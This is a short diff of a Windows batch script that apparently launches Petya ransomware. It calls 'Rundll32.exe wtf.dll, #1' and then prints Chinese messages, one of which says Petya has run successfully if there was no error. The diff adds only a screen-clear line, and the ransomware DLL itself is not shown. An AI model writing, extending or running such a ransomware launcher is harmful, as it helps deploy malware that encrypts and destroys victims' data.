@@ -30,6 +30,7 @@ C:/Windows/System32/Rundll32.exe wtf.dll, #1
 if ERRORLEVEL ==0 goto shutdownembed
 goto error
 :error
+cls
 echo 出错啦！回车键退出。<pause<nul
 :shutdownembed
 echo 如果上面Rundll32没有错误，Petya已经成功运行。
